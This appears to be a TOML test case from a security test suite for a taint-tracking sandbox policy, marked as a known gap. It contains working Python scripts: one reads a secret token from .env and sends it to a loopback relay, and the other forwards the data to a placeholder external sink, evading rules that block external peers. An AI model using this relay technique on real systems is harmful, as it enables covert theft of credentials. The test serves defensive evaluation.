# KNOWN GAP: `recommended` forbids `external`/`unknown` peers but permits
# `loopback`. Shell 1 (a different, untainted principal) runs a relay that
# listens on 127.0.0.1 and forwards to the external sink. Shell 0 reads the
# secret and sends it to the loopback relay -- an allowed loopback peer -- and
# the relay, never having read a secret, carries it out. Registered in
# known-gaps.toml.
name = "proxy-via-loopback"
kind = "attack"
policy = "recommended"
# No shared `principal`: the relay is a separate principal from the reader.

[[files]]
path = ".env"
contents = "TOKEN={CANARY}\n"

[[files]]
path = "relay.py"
contents = """
import socket
srv = socket.socket()
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("127.0.0.1", 18080))
srv.listen(1)
conn, _ = srv.accept()
data = conn.recv(65536)
out = socket.socket()
out.connect(("{SINK_HOST}", {SINK_PORT}))
out.sendall(data)
"""

[[files]]
path = "send.py"
contents = """
import socket, time
secret = open(".env", "rb").read()
time.sleep(0.5)
s = socket.socket()
s.connect(("127.0.0.1", 18080))
s.sendall(secret)
"""

[[steps]]
shell = 1
run = "python3 relay.py &"
expect = "accepted"

[[steps]]
shell = 0
run = "python3 send.py"
expect = "any"

[oracle]
encodings = ["raw", "base64", "hex"]
